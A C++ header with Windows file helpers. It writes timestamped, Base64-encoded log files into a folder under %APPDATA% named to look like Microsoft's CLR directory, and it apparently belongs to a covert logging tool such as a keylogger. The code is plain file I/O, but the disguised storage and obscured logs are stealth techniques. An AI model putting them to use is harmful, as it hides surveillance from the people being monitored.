#ifndef IO_H
#define IO_H

#include <string>
#include <cstdlib>
#include <fstream>
#include "windows.h"
#include "Helper.h"
#include "Base64.h"

namespace IO {
	
	std::string GetOurPath(const bool append_separator = false) {

		std::string appdata_dir(getenv("APPDATA"));
		std::string full = appdata_dir + "\\Microsoft\\CLR";

		return full + (append_separator ? "\\" : "");
	}

	bool MKOneDr(std::string path) {

		/*return (bool)CreateDirectory(path.c_str(), NULL) || 
			GetLastError() == ERROR_ALREADY_EXISTS;*/

		return (bool)CreateDirectoryA(path.c_str(), NULL) ||
			GetLastError() == ERROR_ALREADY_EXISTS;
	}

	bool MKDir(std::string path) {

		for(char &c : path)
			if (c == '\\') {
				
				c = '\0';
				if (!MKOneDr(path))
					return false;
				c = '\\';
			}

		return true;
	}

	template <class T>
	std::string WriteLog(const T& time) {

		Helper::DateTime dateTime;
		std::string path = GetOurPath(true);
		std::string name = dateTime.getDateTimeString("_") + ".log";

		try {

			std::ofstream file(path + name);
			if (!file) return "";
			std::ostringstream s;
			s << "[" << dateTime.getDateTimeString() << "]" <<
			std::endl << time << std::endl;
			std::string data = Base64::encryptB64(s.str());
			file << data;
			if (!file)
				return "";
			file.close();

			return name;
		}

		catch (...) {

			return "";
		}
	}
}

#endif // IO_H
